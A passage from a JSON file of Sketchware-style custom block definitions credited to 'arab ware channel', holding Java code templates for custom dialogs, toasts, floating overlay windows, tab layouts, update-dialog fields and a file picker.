AlertDialog.Builder(%3$s.this).create();\nLayoutInflater %1$sLI \u003d getLayoutInflater();\nView %1$sCV \u003d (View) %1$sLI.inflate(R.layout.%2$s, null);\n%1$s.setView(%1$sCV);","color":"#FF00BCD4","name":"Create Custom Dialog","typeName":"","palette":"193","type":" ","spec":"create %m.CustomDialog From %m.customViews into %m.activity"},{"code":"","color":"#FF00BCD4","name":"fragment custom dialog header","typeName":"","palette":"193","type":"h","spec":"IN FRAGMENT \u003d\u003d\u003e"},{"code":"%1$s \u003d new AlertDialog.Builder(getActivity()).create();\nLayoutInflater %1$sLI \u003d getLayoutInflater();\nView %1$sCV \u003d (View) %1$sLI.inflate(R.layout.%2$s, null);\n%1$s.setView(%1$sCV);","color":"#FF00BCD4","name":"Create Custom Dialog_copy35","typeName":"","palette":"193","type":" ","spec":"create %m.CustomDialog From %m.customViews"},{"code":"final %3$s %2$s \u003d (%3$s)\n%1$sCV.findViewById(R.id.%4$s);","color":"#FF00BCD4","name":"Create View ","typeName":"","palette":"193","type":" ","spec":"%m.CustomDialog Create View with ID %s.inputOnly with type %m.typeview from ID %s.inputOnly From The Custom View "},{"code":"%1$s.setCancelable(%2$s);","color":"#FF00BCD4","name":"Set Cancelable","typeName":"","palette":"193","type":" ","spec":"%m.CustomDialog Set Cancelable %b"},{"code":"%1$s.getWindow().setBackgroundDrawable(new ColorDrawable(%2$s));","color":"#FF00BCD4","name":"set color","typeName":"","palette":"193","type":" ","spec":"%m.CustomDialog set color %m.color"},{"code":"%1$s.show();","color":"#FF00BCD4","name":"Show Dialog","typeName":"","palette":"193","type":" ","spec":"%m.CustomDialog Show"},{"code":"%1$s.dismiss();","color":"#FF00BCD4","name":"dismiss","typeName":"","palette":"193","type":" ","spec":"%m.CustomDialog Dismiss"},{"code":"%1$s.setOnDismissListener(new DialogInterface.OnDismissListener() {\n@Override\npublic void onDismiss(DialogInterface dialogInterface) {\n%2$s\n} \n});","color":"#FF00BCD4","name":"OnDismiss","typeName":"","palette":"193","type":"c","spec":"%m.CustomDialog On Dismiss"},{"code":"final WindowManager.LayoutParams %1$sl \u003d %1$s.getWindow().getAttributes();\n%1$sl.gravity \u003d Gravity.TOP | Gravity.LEFT;\n%1$sl.x \u003d (int) %2$s;\n%1$sl.y \u003d (int) %3$s;\n%1$s.getWindow().setAttributes(%1$sl);","color":"#FF00BCD4","name":"move","typeName":"","palette":"193","type":" ","spec":"%m.CustomDialog set X %d set Y %d"},{"code":"","color":"#FF00695C","name":"credits......","typeName":"","palette":"193","type":"h","spec":"by arab ware channel"},{"code":"}\npublic static class CustomDialogByArabWare {\n\nprivate AlertDialog alertDialog;\nprivate View view;\nprivate Context context;\nprivate boolean isCancelable;\nprivate boolean isActivity;\nprivate Fragment fragmentContext;\n\npublic CustomDialogByArabWare(Activity activity) {\n\ncontext \u003d activity;\n\nalertDialog \u003d new AlertDialog.Builder(context).create();\n\nalertDialog.getWindow().setBackgroundDrawable(null);\n\nisActivity \u003d true;\n\n}\n\npublic CustomDialogByArabWare(Fragment fragment) {\n\nfragmentContext \u003d fragment;\n\ncontext \u003d fragment.getActivity();\n\nalertDialog \u003d new AlertDialog.Builder(context).create();\n\nalertDialog.getWindow().setBackgroundDrawable(null);\n\nisActivity \u003d false;\n\n}\n\npublic void setLayout(int layout) {\n\nif(isActivity) {\n\nview \u003d (View) ((Activity)context).getLayoutInflater().inflate(layout, null);\n\n} else {\n\nview \u003d (View) fragmentContext.getActivity().getLayoutInflater().inflate(layout, null);\n\n}\n\nalertDialog.setView(view);\n\n}\n\npublic void show() {\nalertDialog.show();\n}\n\npublic void setCancelable(boolean b) {\nalertDialog.setCancelable(b);\nisCancelable \u003d b;\n}\n\npublic boolean isCancelable() {\nreturn isCancelable;\n}\n\n\npublic View getView(int viewId) {\nreturn view.findViewById(viewId);\n}\n\npublic void dimiss() {\nalertDialog.dismiss();\n}\n\n}\n{","color":"#FF00695C","name":"library .....","typeName":"","palette":"193","type":" ","spec":"library ( put me at more block )  (المكتبة) بلوك مور في ضعني"},{"code":"}\nprivate CustomDialogByArabWare %1$sCD;\n{","color":"#FF00695C","name":"put me at more block also","typeName":"","palette":"193","type":" ","spec":"%m.dialog put me at more block بلوك مور في ضعني"},{"code":"%1$sCD \u003d new CustomDialogByArabWare(%2$s.this);","color":"#FF00695C","name":"create new custom dialog ....","typeName":"","palette":"193","type":" ","spec":"create new custom dialog %m.activity"},{"code":"%1$sCD.setLayout(R.layout.%2$s);","color":"#FF00695C","name":"setLayout.....","typeName":"","palette":"193","type":" ","spec":"%m.dialog setLayout %m.layout"},{"code":"%1$sCD.setCancelable(%2$s);","color":"#FF00695C","name":"setCancelable....","typeName":"","palette":"193","type":" ","spec":"%m.dialog setCancelable %b"},{"code":"%1$sCD.isCancelable()","color":"#FF00695C","name":"isCancelable....","typeName":"","palette":"193","type":"b","spec":"%m.dialog isCancelable"},{"code":"%1$sCD.show();","color":"#FF00695C","name":"show ......","typeName":"","palette":"193","type":" ","spec":"%m.dialog show"},{"code":"%1$sCD.dismiss();","color":"#FF00695C","name":"dismiss .......","typeName":"","palette":"193","type":" ","spec":"%m.dialog dismiss"},{"code":"((%2$s)%1$sCD.getView(R.id.%3$s))","color":"#FF00695C","name":"getView .....","typeName":"View","palette":"193","type":"v","spec":"%m.dialog getViewFromCustomView type %m.typeview and view id %s.inputOnly"},{"code":"","color":"#FFE53935","name":"created by arab ware channel !!!!","typeName":"","palette":"194","type":"h","spec":"created by arab ware channel"},{"code":"String madeErrMsg \u003d \"\";\nString[] exceptionType \u003d {\"StringIndexOutOfBoundsException\",\"IndexOutOfBoundsException\",\"ArithmeticException\",\"NumberFormatException\",\"ActivityNotFoundException\"};\nString[] errMessage\u003d {\"Invalid string operation\\n\",\"Invalid list operation\\n\",\"Invalid arithmetical operation\\n\",\"Invalid toNumber block operation\\n\",\"Invalid intent operation\"};\nIntent intent \u003d getIntent();\n\t\tString errMsg \u003d \"\";\n\t\tif(intent !\u003d null){\n\t\t\terrMsg \u003d intent.getStringExtra(\"error\");\n\tString[] spilt \u003d errMsg.split(\"\\n\");\n\t\t\t//errMsg \u003d spilt[0];\n\t\t\ttry {\n\t\t\t\tfor (int j \u003d 0; j \u003c exceptionType.length; j++) {\n\t\t\t\t\tif (spilt[0].contains(exceptionType[j])) {\n\t\t\t\t\t\tmadeErrMsg \u003d errMessage[j];\n\n\t\t\t\t\t\tint addIndex \u003d spilt[0].indexOf(exceptionType[j]) + exceptionType[j].length();\n\n\t\t\t\t\t\tmadeErrMsg +\u003d spilt[0].substring(addIndex, spilt[0].length());\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif(madeErrMsg.isEmpty()) madeErrMsg \u003d errMsg;\n\t\t\t}catch(Exception e){}\n\n\t\t}","color":"#FFE53935","name":"library","typeName":"","palette":"194","type":" ","spec":"library of custom error |pls put this into activity with name debug|"},{"code":"madeErrMsg","color":"#FFE53935","name":"get error message","typeName":"","palette":"194","type":"s","spec":"get error message"},{"code":"LayoutInflater %1$sLI_t_a \u003d getLayoutInflater();\nView %1$sCV_t_a \u003d (View) %1$sLI_t_a.inflate(R.layout.%2$s, null);\n_coordinator.removeAllViews();\n_coordinator.addView(%1$sCV_t_a);","color":"#FFAFB42B","name":"create custom activity","typeName":"","palette":"195","type":" ","spec":"%m.activity replace with %m.layout"},{"code":"final %3$s %2$s \u003d (%3$s)\n%1$sCV_t_a.findViewById(R.id.%4$s);","color":"#FFAFB42B","name":"adf view kskak","typeName":"","palette":"195","type":" ","spec":"%m.activity add view with new id %s.inputOnly with type %m.typeview with old id ( from custom view ) %s.inputOnly"},{"code":"","color":"#FFD32F2F","name":"by","typeName":"","palette":"196","type":"h","spec":"BY ARAB WARE CHANNEL"},{"code":"%1$s.setupWithViewPager(%3$s);\nint %1$sLength \u003d %1$s.getTabCount();\nfor (int i \u003d 0; i \u003c %1$sLength; i++) {\n%1$s.getTabAt(i).setCustomView(getTabView(i));\n}","color":"#FFD32F2F","name":"tablyaout","typeName":"","palette":"196","type":" ","spec":"%m.tablayout set %m.customViews with %m.viewpager"},{"code":"int %1$sLength \u003d %1$s.getTabCount();\nfor (int i \u003d 0; i \u003c %1$sLength; i++) {\n%1$s.getTabAt(i).setCustomView(getTabView(i));\n}","color":"#FFD32F2F","name":"tablyaout_copy89","typeName":"","palette":"196","type":" ","spec":"%m.tablayout set %m.customViews"},{"code":"","color":"#FFD32F2F","name":"put this in more block","typeName":"","palette":"196","type":"h","spec":"more block"},{"code":"}\npublic View getTabView(int position) {\nView %1$sV \u003d LayoutInflater.from(%2$s.this).inflate(R.layout.%3$s, null);\n%4$s\nreturn %1$sV;","color":"#FFD32F2F","name":"MorwBlock","typeName":"","palette":"196","type":"c","spec":"%m.tablayout %m.activity %m.customViews"},{"code":"final %3$s %2$s \u003d (%3$s)\n%1$sV.findViewById(R.id.%4$s);","color":"#FFD32F2F","name":"add vuew-","typeName":"","palette":"196","type":" ","spec":"%m.tablayout add view with id %s.inputOnly type %m.typeview old id (custm view) %s.inputOnly"},{"code":"","color":"#FFD50000","name":"by who ?","typeName":"","palette":"197","type":"h","spec":"By Arab Ware Channel"},{"code":"View %1$sV \u003d getLayoutInflater().inflate(R.layout.%2$s, null);","color":"#FFD50000","name":"Create View2","typeName":"","palette":"197","type":" ","spec":"%m.CustomPopUp set %m.customViews"},{"code":"final PopupWindow %1$s \u003d new PopupWindow(%1$sV, ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT, true);","color":"#FFD50000","name":"Create2","typeName":"","palette":"197","type":" ","spec":"%m.CustomPopUp SetUp"},{"code":"final LinearLayout %3$s_fab \u003d %1$sV.findViewById(R.id.%3$s);\r\ncom.google.android.material.floatingactionbutton.FloatingActionButton %2$s \u003d new com.google.android.material.floatingactionbutton.FloatingActionButton(%4$s.this);\n%3$s_fab.addView(%2$s);\r","color":"#FFD50000","name":"addFab","typeName":"","palette":"197","type":" ","spec":"%m.CustomPopUp add fab with id %s.inputOnly from custom view linear id %s.inputOnly in %m.activity"},{"code":"%1$s.dismiss();","color":"#FFD50000","name":"DismissPopUp2","typeName":"","palette":"197","type":" ","spec":"%m.CustomPopUp Dismiss"},{"code":"%1$s.setAnimationStyle(android.R.style.Animation_Dialog);\n%1$s.showAsDropDown(_fab, (int) %2$s,(int) %3$s);\n%1$s.setBackgroundDrawable(new BitmapDrawable());","color":"#FFD50000","name":"hwjaja2","typeName":"","palette":"197","type":" ","spec":"%m.CustomPopUp set X %d set Y %d"},{"code":"","color":"#FFF57C00","name":"created by arab ware channel -_-","typeName":"","palette":"198","type":"h","spec":"created by arab ware channel"},{"code":"LayoutInflater %1$sLT \u003d getLayoutInflater(); \nView %1$sVT \u003d %1$sLT.inflate(R.layout.%2$s, null);","color":"#FFF57C00","name":"create custom toast","typeName":"","palette":"198","type":" ","spec":"%m.CustomToast Create From %m.customViews"},{"code":"final %3$s %2$s \u003d (%3$s)\n%1$sVT.findViewById(R.id.%4$s);","color":"#FFF57C00","name":"custom toast - add view","typeName":"","palette":"198","type":" ","spec":"%m.CustomToast Add View with ID %s.inputOnly With Type %m.typeview From ID %s.inputOnly"},{"code":"Toast %1$sT \u003d Toast.makeText(getApplicationContext(),\"\",%2$s);\n%1$sT.setView(%1$sVT);\n%1$sT.show();","color":"#FFF57C00","name":"Show Custom Toast","typeName":"","palette":"198","type":" ","spec":"%m.CustomToast Set Duration %d  show"},{"code":"","color":"#FFAD1457","name":"credits.....","typeName":"","palette":"198","type":"h","spec":"created by arab ware channel"},{"code":"}\n\npublic static class CustomToastByArabWare {\n\nprivate Toast toast;\nprivate View view;\nprivate Context context;\nprivate boolean isActivity;\nprivate Fragment fragmentContext;\n\npublic CustomToastByArabWare(Activity activity) {\n\n\ncontext \u003d activity;\n\ntoast \u003d Toast.makeText(context,\"\",2726);\n\nisActivity \u003d true;\n\n}\n\npublic CustomToastByArabWare(Fragment fragment) {\n\nfragmentContext \u003d fragment;\n\ncontext \u003d fragment.getActivity();\n\ntoast \u003d Toast.makeText(context,\"\",2726);\n\nisActivity \u003d false;\n\n}\n\npublic void setLayout(int layout) {\n\nif(isActivity) {\n\nview \u003d (View) ((Activity)context).getLayoutInflater().inflate(layout, null);\n\n} else {\n\nview \u003d (View) fragmentContext.getActivity().getLayoutInflater().inflate(layout, null);\n\n}\n\ntoast.setView(view);\n\n}\n\npublic void show() {\n\ntoast.show();\n\n}\n\npublic View getView(int viewId) {\n\nreturn view.findViewById(viewId);\n\n}\n\n}\n\n{","color":"#FFAD1457","name":"custom toast library ........","typeName":"","palette":"198","type":" ","spec":"put me at more block ( library ) (المكتبة) بلوك مور في ضعني"},{"code":"}\nprivate CustomToastByArabWare %1$sCT;\n{","color":"#FFAD1457","name":"put me at more block","typeName":"","palette":"198","type":" ","spec":"create new toast %m.activity put me at more block بلوك مور في ضعني"},{"code":"%1$sCT \u003d new CustomToastByArabWare(%1$s.this);","color":"#FFAD1457","name":"create new toast .....","typeName":"","palette":"198","type":" ","spec":"create new toast in %m.activity"},{"code":"%1$sCT.setLayout(R.layout.%2$s);","color":"#FFAD1457","name":"setLayout ...","typeName":"","palette":"198","type":" ","spec":"%m.activity set toast layout %m.customViews"},{"code":"%1$sCT.show();","color":"#FFAD1457","name":"show ........","typeName":"","palette":"198","type":" ","spec":"%m.activity show toast"},{"code":"((%2$s)%1$sCT.getView(R.id.%3$s))","color":"#FFAD1457","name":"getView ........","typeName":"View","palette":"198","type":"v","spec":"%m.activity getToastView type %m.typeview viewId %s.inputOnly"},{"code":"","color":"#FFF57C00","name":"created by me .","typeName":"","palette":"199","type":"h","spec":"created by arab ware channel"},{"code":"}\nprivate View %1$sview;\nprivate WindowManager %1$swindow;\nprivate LayoutInflater %1$sin;\nWindowManager.LayoutParams %1$spara;\n{","color":"#FFF57C00","name":"PUT ME AT MORE BLOCK","typeName":"","palette":"199","type":" ","spec":"put me at more block %m.intent"},{"code":"int LAYOUT_FLAG;\nif (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.O) {\n\t    LAYOUT_FLAG \u003d WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;\n} else {\n\t    LAYOUT_FLAG \u003d WindowManager.LayoutParams.TYPE_PHONE;\n}\n\n%1$spara \u003d new WindowManager.LayoutParams(\n    WindowManager.LayoutParams.WRAP_CONTENT,\n    WindowManager.LayoutParams.WRAP_CONTENT,\n    LAYOUT_FLAG,\n      \n    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL \n     ,\n\n    PixelFormat.TRANSLUCENT);\n\n%1$swindow \u003d (WindowManager) getSystemService(WINDOW_SERVICE);\n %1$sin \u003d (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);\n  \n\n%1$sview \u003d (View) getLayoutInflater().inflate(R.layout.%2$s, null);","color":"#FFF57C00","name":"create new floating window","typeName":"","palette":"199","type":" ","spec":"%m.intent create new floating window from custom view %m.customViews"},{"code":"%2$s.setOnTouchListener(new OnTouchListener() {\n\t\n\tprivate int x;\n\tprivate int y;\n\t\n\t       @Override\n\t       public boolean onTouch(View v, MotionEvent event) {\n\t\t\n\t\tswitch (event.getAction()) { \n\t\t\tcase MotionEvent.ACTION_DOWN: \n\t\t\tx \u003d (int) event.getRawX(); \n\t\t\ty \u003d (int) event.getRawY(); \n\t\t\tbreak;\n\t\t\tcase MotionEvent.ACTION_MOVE:\n\t\t\tint nowX \u003d (int) event.getRawX(); \n\t\t\tint nowY \u003d (int) event.getRawY(); \n\t\t\tint movedX \u003d nowX - x; \n\t\t\tint movedY \u003d nowY - y; \n\t\t\tx \u003d nowX;\n\t\t\ty \u003d nowY; \n\t\t\t%1$spara.x \u003d %1$spara.x + movedX; \n\t\t\t%1$spara.y \u003d %1$spara.y + movedY;\n\t\t\t%1$swindow.updateViewLayout(%1$sview, %1$spara); \n\t\t\tbreak;\n\t\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t\t return false;\n\t\t }\n\t });\n%1$spara.gravity \u003d Gravity.TOP | Gravity.LEFT;\n       %1$spara.x \u003d 0;\n       %1$spara.y \u003d 0;","color":"#FFF57C00","name":"view on touch","typeName":"","palette":"199","type":" ","spec":"%m.intent set draggable view %s.inputOnly "},{"code":"","color":"#FFF57C00","name":"activity floating window header","typeName":"","palette":"199","type":"h","spec":"IN ACTIVITY \u003d\u003d\u003e"},{"code":"final String %1$sAV \u003d Build.VERSION.RELEASE;\r\nif (Double.parseDouble(%1$sAV.substring((int)(0), (int)(1))) \u003c 6) {\r\n\t%1$swindow.addView(%1$sview, %1$spara);\r\n}\relse {\r\n\tif (android.provider.Settings.canDrawOverlays(%2$s.this)) {\n\t\t\t\t%1$swindow.addView(%1$sview, %1$spara);\n\t} else {\n\t\t\t\tIntent %1$si \u003d new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,\n\t\t\t\tUri.parse(\"package:\" + getPackageName()));\n\t\t\t\tstartActivity(%1$si);\n\t}\r\r\n}","color":"#FFF57C00","name":"show ","typeName":"","palette":"199","type":" ","spec":"%m.intent show floating window %m.activity"},{"code":"","color":"#FFF57C00","name":"fragment floating window header","typeName":"","palette":"199","type":"h","spec":"IN FRAGMENT \u003d\u003d\u003e"},{"code":"final String %1$sAV \u003d Build.VERSION.RELEASE;\r\nif (Double.parseDouble(%1$sAV.substring((int)(0), (int)(1))) \u003c 6) {\r\n\t%1$swindow.addView(%1$sview, %1$spara);\r\n}\relse {\r\n\tif (android.provider.Settings.canDrawOverlays(getActivity())) {\n\t\t\t\t%1$swindow.addView(%1$sview, %1$spara);\n\t} else {\n\t\t\t\tIntent %1$si \u003d new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,\n\t\t\t\tUri.parse(\"package:\" + getPackageName()));\n\t\t\t\tstartActivity(%1$si);\n\t}\r\r\n}","color":"#FFF57C00","name":"show _copy29","typeName":"","palette":"199","type":" ","spec":"%m.intent show floating window %m.activity"},{"code":"final %3$s %2$s \u003d (%3$s)%1$sview.findViewById(R.id.%4$s);","color":"#FFF57C00","name":"add view floating","typeName":"","palette":"199","type":" ","spec":"%m.intent add new view with id %s.inputOnly with type %m.typeview with old id ( from custom view) %s.inputOnly"},{"code":"%1$swindow.removeView(%1$sview);","color":"#FFF57C00","name":"remove","typeName":"","palette":"199","type":" ","spec":"%m.intent close"},{"code":"","color":"#FF0288D1","name":"createdByArabWareChannel","typeName":"","palette":"200","type":"h","spec":"created by arab ware channel - api from updatity app"},{"code":"","color":"#FF0288D1","name":"text","typeName":"","palette":"200","type":"h","spec":"text"},{"code":"%1$s.get(\"dialogTitle\").toString()","color":"#FF0288D1","name":"Update-title","typeName":"","palette":"200","type":"s","spec":"%m.varMap get Dialog Title"},{"code":"%1$s.get(\"dialogSubtitle\").toString()","color":"#FF0288D1","name":"Update-Subtitle","typeName":"","palette":"200","type":"s","spec":"%m.varMap Get Subtitle"},{"code":"%1$s.get(\"dialogBtnExtraTxt\").toString()","color":"#FF0288D1","name":"Update-ExtraButtonText","typeName":"","palette":"200","type":"s","spec":"%m.varMap Get Extra Button Text"},{"code":"%1$s.get(\"dialogBtnMainTxt\").toString()","color":"#FF0288D1","name":"Update-MainButtonText","typeName":"","palette":"200","type":"s","spec":"%m.varMap Get  Main Button Text"},{"code":"%1$s.get(\"customDialogIcon\").toString()","color":"#FF0288D1","name":"get-update-custom-icon-link","typeName":"","palette":"200","type":"s","spec":"%m.varMap get link of custom icon"},{"code":"%1$s.get(\"openLinkExtra\").toString()","color":"#FF0288D1","name":"getLinkOfUpdate","typeName":"","palette":"200","type":"s","spec":"%m.varMap get link of update"},{"code":"%1$s.get(\"isOneTimeKey\").toString()","color":"#FF0288D1","name":"getKey","typeName":"","palette":"200","type":"s","spec":"%m.varMap get shared preference key of One Time Key"},{"code":"%1$s.get(\"newVersion\").toString()","color":"#FF0288D1","name":"getNewVersion","typeName":"","palette":"200","type":"s","spec":"%m.varMap Get The Version From App "},{"code":"try {\r\nandroid.content.pm.PackageInfo %1$sP \u003d this.getPackageManager().getPackageInfo(getPackageName(), 0);\r\n%1$s \u003d %1$sP.versionName;\r\n} catch (android.content.pm.PackageManager.NameNotFoundException e) {\r\ne.printStackTrace();\r\n}\r","color":"#FF0288D1","name":"getAppVersion","typeName":"","palette":"200","type":" ","spec":"Get Your App Version Into %m.varStr"},{"code":"","color":"#FF0288D1","name":"booleans","typeName":"","palette":"200","type":"h","spec":"booleans"},{"code":"%1$s.get(\"dialogOption\").toString().equals(\"warning\")","color":"#FF0288D1","name":"update-type-1","typeName":"","palette":"200","type":"b","spec":"%m.varMap update type is waring"},{"code":"%1$s.get(\"dialogOption\").toString().equals(\"update\")","color":"#FF0288D1","name":"update-type-2","typeName":"","palette":"200","type":"b","spec":"%m.varMap update type is update"},{"code":"%1$s.get(\"dialogOption\").toString().equals(\"message\")","color":"#FF0288D1","name":"update-type-3","typeName":"","palette":"200","type":"b","spec":"%m.varMap update type is message"},{"code":"%1$s.get(\"dialogOption\").toString().equals(\"custom\")","color":"#FF0288D1","name":"update-type-4","typeName":"","palette":"200","type":"b","spec":"%m.varMap update type is custom"},{"code":"%1$s.get(\"dialogBtnExtra\").toString().equals(\"true\")","color":"#FF0288D1","name":"update-extra-button-is-avaiable","typeName":"","palette":"200","type":"b","spec":"%m.varMap update extra button is avaiable"},{"code":"%1$s.get(\"dialogBtnExtraClick\").toString().equals(\"exit\")","color":"#FF0288D1","name":"update-extra-button-is-avaiable-exit-on-click","typeName":"","palette":"200","type":"b","spec":"%m.varMap update extra button on click exit"},{"code":"%1$s.get(\"dialogBtnExtraClick\").toString().equals(\"browser\")","color":"#FF0288D1","name":"update-extra-button-is-avaiable-on-click","typeName":"","palette":"200","type":"b","spec":"%m.varMap update extra button on click browse"},{"code":"%1$s.get(\"dialogBtnExtraClick\").toString().equals(\"dismiss\")","color":"#FF0288D1","name":"update-extra-button-is-avaiable-on-click_dismiss","typeName":"","palette":"200","type":"b","spec":"%m.varMap update extra button on click dismiss"},{"code":"%1$s.get(\"dialogBtnMain\").toString().equals(\"true\")","color":"#FF0288D1","name":"update-main-button-is-avaiable","typeName":"","palette":"200","type":"b","spec":"%m.varMap update main button is avaiable"},{"code":"%1$s.get(\"dialogBtnMainClick\").toString().equals(\"exit\")","color":"#FF0288D1","name":"update-main-button-is-avaiable-exit-on-click","typeName":"","palette":"200","type":"b","spec":"%m.varMap update main button on click exit"},{"code":"%1$s.get(\"dialogBtnMainClick\").toString().equals(\"browser\")","color":"#FF0288D1","name":"update-main-button-is-avaiable-on-click","typeName":"","palette":"200","type":"b","spec":"%m.varMap update main button on click browse"},{"code":"%1$s.get(\"dialogBtnMainClick\").toString().equals(\"dismiss\")","color":"#FF0288D1","name":"update-main-button-is-avaiable-on-click_dismiss","typeName":"","palette":"200","type":"b","spec":"%m.varMap update main button on click dismiss"},{"code":"%1$s.get(\"isCancelable\").toString().equals(\"true\")","color":"#FF0288D1","name":"isCancelable","typeName":"","palette":"200","type":"b","spec":"%m.varMap is cancelable ?"},{"code":"%1$s.get(\"alertOption\").toString().equals(\"dialog\")","color":"#FF0288D1","name":"getType1","typeName":"","palette":"200","type":"b","spec":"%m.varMap is dialog ?"},{"code":"%1$s.get(\"alertOption\").toString().equals(\"sheet\")","color":"#FF0288D1","name":"getType2","typeName":"","palette":"200","type":"b","spec":"%m.varMap is bottom sheet"},{"code":"%1$s.get(\"isOneTime\").toString().equals(\"true\")","color":"#FF0288D1","name":"isOneTime","typeName":"","palette":"200","type":"b","spec":"%m.varMap is one time ?"},{"code":"","color":"#FFE53935","name":"created...","typeName":"","palette":"197","type":"h","spec":"BY ARAB WARE CHANNEL"},{"code":"}\nprivate List\u003cMultiChoicesCircleButton.Item\u003e %1$sItem \u003d new ArrayList\u003c\u003e();\npublic void %1$sV () {","color":"#FFE53935","name":"addInMoreBlock","typeName":"","palette":"197","type":" ","spec":"%m.view put me at more block"},{"code":"MultiChoicesCircleButton.Item %2$s \u003d new MultiChoicesCircleButton.Item(%3$s, getResources().getDrawable(R.drawable.%4$s), %5$s);\n%1$sItem.add(%2$s);","color":"#FFE53935","name":"create item.....","typeName":"","palette":"197","type":" ","spec":"%m.view create item with ID %s.inputOnly with text %s with icon %m.resource set place %d"},{"code":"%1$s.setButtonItems(%1$sItem);","color":"#FFE53935","name":"setButtonItems","typeName":"","palette":"197","type":" ","spec":"%m.view setButtonItems"},{"code":"%1$s.setIcon(getResources().getDrawable(R.drawable.%2$s));","color":"#FFE53935","name":"setIcon...","typeName":"","palette":"197","type":" ","spec":"%m.view set MainIcon %m.resource"},{"code":"%1$s.setText(%2$s);","color":"#FFE53935","name":"setText..","typeName":"","palette":"197","type":" ","spec":"%m.view setText %s"},{"code":"%1$s.setCollapseRadius((float) %2$s);","color":"#FFE53935","name":"setCollapseRadius","typeName":"","palette":"197","type":" ","spec":"%m.view setCollapseRadius %d"},{"code":"%1$s.setExpandRadius((float) %2$s);","color":"#FFE53935","name":"setExpandRadius","typeName":"","palette":"197","type":" ","spec":"%m.view setExpandRadius %d"},{"code":"%1$s.setDuration((int) %2$s);","color":"#FFE53935","name":"setDuration","typeName":"","palette":"197","type":" ","spec":"%m.view setDuration %d"},{"code":"%1$s.setTextColor(%2$s);","color":"#FFE53935","name":"setTextColor...","typeName":"","palette":"197","type":" ","spec":"%m.view setTextColor  %m.color"},{"code":"%1$s.setButtonColor(%2$s);","color":"#FFE53935","name":"setButtonColor...","typeName":"","palette":"197","type":" ","spec":"%m.view setButtonColor %m.color"},{"code":"%1$s.setItemBackgroundColor(%2$s);","color":"#FFE53935","name":"setItemBackgroundColor","typeName":"","palette":"197","type":" ","spec":"%m.view setItemBackgroundColor %m.color"},{"code":"%1$s.setOnSelectedItemListener(new MultiChoicesCircleButton.OnSelectedItemListener() {\n@Override\npublic void onSelected(MultiChoicesCircleButton.Item item, int index) {\n%2$s\n}\n});\n%1$s.setOnHoverItemListener(new MultiChoicesCircleButton.OnHoverItemListener(){\n@Override\npublic void onHovered(MultiChoicesCircleButton.Item item, int index) {\n%3$s\n}\n});","color":"#FFE53935","typeName":"","name":"On....","palette":"197","type":"e","spec":"%m.view on selected","spec2":"on hovered"},{"code":"item.getText()","color":"#FFE53935","name":"getText...","typeName":"","palette":"197","type":"s","spec":"get item text"},{"code":"%1$s.show();","color":"#FFE53935","name":"show...","typeName":"","palette":"197","type":" ","spec":"%m.view show"},{"code":"%1$s.show(%2$s);","color":"#FFE53935","name":"showWithanimation","typeName":"","palette":"197","type":" ","spec":"%m.view show with animation %b"},{"code":"%1$s.hide();","color":"#FFE53935","name":"hide....","typeName":"","palette":"197","type":" ","spec":"%m.view hide"},{"code":"%1$s.hide(%2$s);","color":"#FFE53935","name":"hideWithanimation","typeName":"","palette":"197","type":" ","spec":"%m.view hide with animation %b"},{"code":"","color":"#FF03A9F4","name":"created by me  ","typeName":"","palette":"201","type":"h","spec":"created by arab ware channel"},{"code":"DialogProperties %1$sp \u003d new DialogProperties();","color":"#FF03A9F4","name":"create new property","typeName":"","palette":"201","type":" ","spec":"%m.FilePickerDialog create new property"},{"code":"%1$sp.selection_mode \u003d %2$s;\n%1$sp.selection_type \u003d DialogConfigs.FILE_SELECT;\n%1$sp.root \u003d new java.io.File(%4$s);\n%1$sp.error_dir \u003d new java.io.File(%4$s);\n%1$sp.offset \u003d new java.io.File(%4$s);\n%1$sp.extensions \u003d %3$s;","color":"#FF03A9F4","name":"set property","typeName":"","palette":"201","type":" ","spec":"%m.FilePickerDialog set %m.selection_mode set %m.extensions set main path %s"},{"code":"DialogConfigs.SINGLE_MODE","color":"#FF03A9F4","name":"single","typeName":"selection_mode","palette":"201","type":"v","spec":"single selection"},{"code":"DialogConfigs.MULTI_MODE","color":"#FF03A9F4","name":"multi","typeName":"selection_mode","palette":"201","type":"v","spec":"multi selection"},{"code":"null","color":"#FF03A9F4","name":"null","typeName":"extensions","palette":"201","type":"v","spec":"all"},{"code":"new String[] {%1$s}","color":"#FF03A9F4","name":"new","typeName":"extensions","palette":"201","type":"v","spec":"extensions %s "},{"code":"%1$s,%2$s","color":"#FF03A9F4","name":"and...","typeName":"String","palette":"201","type":"v","spec":"%s and %s"},{"code":"","color":"#FF03A9F4","name":"activity file picker","typeName":"","palette":"201","type":"h","spec":"IN ACTIVITY \u003d\u003d\u003e"},{"code":"%1$s \u003d new FilePickerDialog(%2$s.this,%1$sp);\n%1$s.setTitle(%3$s);","color":"#FF03A9F4","name":"file","typeName":"","palette":"201","type":" ","spec":"%m.FilePickerDialog create %m.activity with title %s"},{"code":"","color":"#FF03A9F4","name":"file picker fragment","typeName":"","palette":"201","type":"h","spec":"IN FRAGMENT \u003d\u003d\u003e"},{"code":"%1$s \u003d new FilePickerDialog(getActivity(),%1$sp);\n%1$s.setTitle(%3$s);","color":"#FF03A9F4","name":"file_copy80","typeName":"","palette":"201","type":" ","spec":"%m.FilePickerDialog create with title %s"},{"code":"%1$s.setDialogSelectionListener(new DialogSelectionListener() {\n@Override public void onSelectedFilePaths(String[] files) {\n%2$s\n} \n});","color":"#FF03A9F4","name":"on file picked","typeName":"","palette":"201","type":"c","spec":"%m.FilePickerDialog on file picked"},{"code":"Arrays.asList(files).get((int) %1$s).toString()","color":"#FF03A9F4","name":"get file path at","typeName":"","palette":"201","type":"s","spec":"get file path at %d"},{"code":"files.length","color":"#FF03A9F4","name":"getLength  ...","typeName":"","palette":"201","type":"d","spec":"get picked files length"},{"code":"%1$s.setPositiveBtnName(%2$s);","color":"#FF03A9F4","name":"setPositiveBtnName..","typeName":"","palette":"201","type":" 